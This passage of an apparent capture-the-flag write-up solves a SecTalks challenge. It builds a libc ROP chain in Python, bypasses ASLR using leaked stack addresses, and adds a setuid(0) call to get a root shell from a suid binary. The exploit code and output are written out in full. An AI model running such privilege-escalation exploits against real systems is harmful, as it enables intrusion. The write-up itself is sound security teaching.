&gt;&gt;&gt; rop_libc = ROP(ELF(&quot;libc-2.28.so&quot;))
[*] '/blah/libc-2.28.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loaded 199 cached gadgets for 'libc-2.28.so'
&gt;&gt;&gt; [g for g in rop_libc.search_iter(regs=[&quot;rax&quot;]) if len(g.insns) == 2]
[Gadget(0x3a638, ['pop rax', 'ret'], ['rax'], 0x8)]
</code></pre>
<p>That's more like it. Now we can find gadgets to set all the registers we want and print out the stack layout:</p>
<pre><code>&gt;&gt;&gt; rop_libc.setRegisters({&quot;rax&quot;: 59, &quot;rdx&quot;: 0, &quot;rdi&quot;: 123, &quot;rsi&quot;: 567})
[(239160, Gadget(0x3a638, ['pop rax', 'ret'], ['rax'], 0x8)),
 (59, 'rax'),
 (146015, Gadget(0x23a5f, ['pop rdi', 'ret'], ['rdi'], 0x8)),
 (123, 'rdi'),
 (1075017,
  Gadget(0x106749, ['pop rdx', 'pop rsi', 'ret'], ['rdx', 'rsi'], 0xc)),
 (0, 'rdx'),
 (567, 'rsi')]
</code></pre>
<h3 id="first-shell" tabindex="-1">First shell <a class="header-anchor" href="#first-shell">#</a></h3>
<pre class="language-python" tabindex="0"><code class="language-python"><span class="token keyword">import</span> struct


<span class="token keyword">def</span> <span class="token function">push_uint64</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"&lt;BQ"</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">pop_print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">b'\x0e'</span>


<span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token operator">*</span>ops<span class="token punctuation">)</span><span class="token punctuation">:</span>
    code <span class="token operator">=</span> <span class="token string">b""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>ops<span class="token punctuation">)</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"code.bin"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>code<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">solve_no_aslr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># Check gdb for address of saved return address 0x55555822</span>
    <span class="token comment"># This value will be different when run outside gdb</span>
    <span class="token comment"># and also maybe if you reboot your computer / alter your environment.</span>
    <span class="token comment"># You can work out the correct address by comparing printed addresses</span>
    <span class="token comment"># in and outside gdb</span>
    return_address_address <span class="token operator">=</span> <span class="token number">0x7fffffffd6d8</span>

    libc <span class="token operator">=</span> <span class="token number">0x00007ffff7a0d000</span>
    rax <span class="token operator">=</span> <span class="token number">0x3b</span>
    rdx <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token comment"># Fill in the correct addresses of gadgets in your libc version</span>
    rdi_call <span class="token operator">=</span> <span class="token number">0x21102</span> <span class="token operator">+</span> libc
    rax_call <span class="token operator">=</span> <span class="token number">0x33544</span> <span class="token operator">+</span> libc
    rdx_rsi_call <span class="token operator">=</span> <span class="token number">0x1150c9</span> <span class="token operator">+</span> libc
    syscall <span class="token operator">=</span> <span class="token number">0x1751f8</span> <span class="token operator">+</span> libc
    cmd <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">"&lt;Q"</span><span class="token punctuation">,</span> <span class="token string">b"/bin/sh\x00"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

    rop_chain_length <span class="token operator">=</span> <span class="token punctuation">(</span>
        <span class="token number">4</span> <span class="token operator">+</span>  <span class="token comment"># calls</span>
        <span class="token number">4</span> <span class="token operator">+</span>  <span class="token comment"># register values</span>
        <span class="token number">3</span>  <span class="token comment"># cmd, *cmd, 0</span>
    <span class="token punctuation">)</span>  <span class="token comment"># = 11</span>

    rdi <span class="token operator">=</span> return_address_address <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token number">8</span>  <span class="token comment"># point to cmd</span>
    rsi <span class="token operator">=</span> return_address_address <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token number">9</span>  <span class="token comment"># point to char * argv[] (point to rdi followed by 0)</span>

    solution <span class="token operator">=</span> <span class="token punctuation">[</span>pop_print<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">18</span> <span class="token operator">+</span> rop_chain_length<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">[</span>
        push_uint64<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">reversed</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
            rax_call<span class="token punctuation">,</span>
            rax<span class="token punctuation">,</span>
            rdi_call<span class="token punctuation">,</span>
            rdi<span class="token punctuation">,</span>
            rdx_rsi_call<span class="token punctuation">,</span>
            rdx<span class="token punctuation">,</span>
            rsi<span class="token punctuation">,</span>
            syscall<span class="token punctuation">,</span>
            cmd<span class="token punctuation">,</span>
            rdi<span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
        <span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token punctuation">]</span>
    write<span class="token punctuation">(</span><span class="token operator">*</span>solution<span class="token punctuation">)</span></code></pre>
<p>Then running the executable:</p>
<pre><code>gef&gt; r
Starting program: /blah/main
0x0
...
0x7fffffffd6ee
0x0
0x7fffffffd6f0
0x555555555822    # Saved return address
0x7fffffffd7d8    # $rbp+0x108
0x100000000
0x555555555830
0x7ffff7a2d830    # $libc+0x20830 (libc vmmaped at 0x7ffff7a0d000)
0x1
0x7fffffffd7d8
0x1f7ffcca0
0x555555555809
0x0
0x34f8d2d9efaa1034
process 18599 is executing new program: /bin/dash
$ 
</code></pre>
<h2 id="aslr-bypass" tabindex="-1">ASLR bypass <a class="header-anchor" href="#aslr-bypass">#</a></h2>
<p>Unfortunately, if you run the executable on the challenge box, it fails. If you look at the printed addresses, they subtly change each time you run the executable due to the <em>anti-hacker protection</em> called Address Space Layout Randomisation (ASLR). At this point, it was obvious that the purpose of ASLR was just to make me cry.</p>
<p>Turn ASLR back on: <code>echo 2 | sudo tee /proc/sys/kernel/randomize_va_space</code></p>
<p>If we can't hardcode the addresses of libc functions or our <code>/bin/sh</code> string, what can we do?</p>
<p>We've already worked out our addresses as offsets from:</p>
<ul>
<li>address of the start of the ROP chain (<code>return_address_address=$rbp+8</code>)</li>
<li>address of the start of libc</li>
</ul>
<p>We notice that due to some magic in <code>_start</code>, the value popped after the saved return address (at <code>$rbp+16</code>) = <code>$rbp+0x108</code>:</p>
<pre><code>&gt; x/2g $rbp+8
0x7fffffffd6d8: 0x0000555555555822      0x00007fffffffd7d8
</code></pre>
<p>This gives us a way to calculate the offset, using some other stack-machine commands.</p>
<pre><code>pop_print() * 19  # pop saved return address, set top of stack to $rbp+16
pop_to_nth_global(99)  # save $rbp+0x108 in global 99
pop_print()
push_uint64(0x100)
push_nth_global(99)  # stack is now [$rbp+0x108, 0x100]
subtract_top_from_pop()
pop_to_nth_global(99)  # save $rbp+8 (i.e. return_address_address) to global 99
</code></pre>
<p>When we want to calculate <code>rdi</code> and <code>rsi</code>, we can:</p>
<ul>
<li><code>push_uint64(offset from return_address_address)</code></li>
<li><code>push_nth_global(99)</code></li>
<li><code>pop_add_to_top()</code></li>
</ul>
<p>Do the same for <code>libc</code> by finding the return address to <code>__libc_start_main+240</code> in the stack. With a bit of care not to mess up the number of pushes and pops you'll get a shell:</p>
<pre><code>$ whoami
user
</code></pre>
<p>‌<figure><picture><source type="image/avif" srcset="/img/aXJw_iKlSF-400.avif 400w"><source type="image/webp" srcset="/img/aXJw_iKlSF-400.webp 400w"><img alt="Oh no!" loading="lazy" decoding="async" src="/img/aXJw_iKlSF-400.png" width="400" height="222"></picture><figcaption>Oh no!</figcaption></figure></p>
<h2 id="whoami" tabindex="-1">whoami <a class="header-anchor" href="#whoami">#</a></h2>
<p>I thought due to suid we would be running as root! Actually on linux there are multiple user ids.</p>
<p>Suid executables are launched with the <em>Effective UID</em> as the file owner (root here). Most syscalls use this for access checks. The <em>Real UID</em> is still set to the user who launched the process.</p>
<p>Most modern shells (including <code>/bin/sh</code>) have a protection mechanism which, on startup, sets the Effective UID to the Real UID, dropping our root privileges. We can work around this by either:</p>
<ul>
<li>Copying over a shell which doesn't drop permissions, and <code>execve</code>ing it</li>
<li>Directly calling <code>/bin/cat file</code> and not getting a shell</li>
<li>Calling the <code>setuid</code> syscall to set our Real UID before running the <code>execve</code> call (I chose this way)</li>
</ul>
<p>Checking the <a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">x64 call table</a> again, we just need to set <code>rax</code> to 105 and <code>rdi</code> to 0 (uid of root). This time, the <code>syscall</code> gadget must be followed by a <code>ret</code> so we can make the <code>execve</code> call afterwards. Pwntools isn't helpful here, so we'll use <a href="https://github.com/sashs/Ropper">ropper</a> which was installed with pwntools.</p>
<pre><code>$ ropper --file libc-2.28.so --search &quot;syscall; ret;&quot;
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: syscall; ret;

[INFO] File: libc-2.28.so
0x00000000000b5b35: syscall; ret;
</code></pre>
<p>Enjoy the root shell and check out the <a href="https://github.com/sectalks/sectalks/blob/9273a1d60b4450b9ce21f75b5fb6163eb7df5612/ctf-solutions/LON0x27/bc/500yen.py">python code</a> for generating <code>code.bin</code>.</p>

<ul class="links-nextprev"><li>Previous: <a href="/user-agent-parsing-redos-cve-2020-5243/">User-agent parsing REDoS (CVE‑2020‑5243)</a></li><li>Next: <a href="/v380-ipcam-move-with-soap/">v380 IPcam: Move with SOAP</a></li>
</ul>

		</main>

		<footer></footer>

		<!-- Current page: /sectalks-ctf-rop-aslr-500/ -->
	</body>
</html>
